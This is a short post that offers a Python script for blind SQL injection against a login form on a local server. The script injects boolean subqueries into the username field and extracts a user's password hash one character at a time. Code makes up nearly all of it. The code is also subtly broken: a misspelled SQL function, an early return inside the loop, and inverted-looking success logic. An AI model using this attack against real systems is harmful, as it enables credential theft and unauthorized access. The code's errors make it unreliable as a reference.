Here are multiple functions to exploit a _blind SQL injection_.

```python
import requests

total_queries = 0

charset = "0123456789abcdef" # character set for 32 hex

prefix = "http://"
target_ip = "127.0.0.1"
target_port = ":5000"
target = prefix + target_ip + target_port

needle = "Welcome back"

def injected_query(payload): # make an injected query with requests module
    global total_queries
    # (') in "admin' and {}--".format(payload) is used to close off the string value of the username field ("admin") and then append additional SQL code provided by the payload
    r = requests.post(url=target,data={"username" : "admin' and {}--".format(payload), "password":"password"})
    total_queries +=1
    return needle.encode() not in r.content # we need to inference if the request was a suceess using the needle in the response

def booblean_query(offset, user_id, character, operator = ">"): # create the boolean query to inject
    # payload is the sql injection itself
    payload = "(select hex(substr(password,{},1)) from user where id={}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload=payload)

def invalid_user(user_id): #query to check if user is valid
    payload = "(select id from user where id = {})".format(user_id)
    return injected_query(payload=payload)

def password_length(user_id): # find user password hash length
    i = 0
    while True:
        payload = "(select lenght(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload=payload):
            return i
        i += 1

def extract_hash(charset, user_id, password_length):
    # itterate through charset and use boolean_query to check if character is found at index in password hash
    found  = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if booblean_query(offset=i, user_id=user_id,character=charset[j]):
                found += charset[j]
                break
        return found
def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0  #reset

# User interaction Script
while True:
    try:
        user_id =  input("> Enter user ID for password hash: ")
        if not invalid_user(user_id=user_id):
            user_password_length = password_length(user_id=user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id,extract_hash(charset=charset,user_id=int(user_id), password_length=user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist.".format(user_id))
            total_queries_taken()
    except KeyboardInterrupt: # Ctr+C 
        break



```
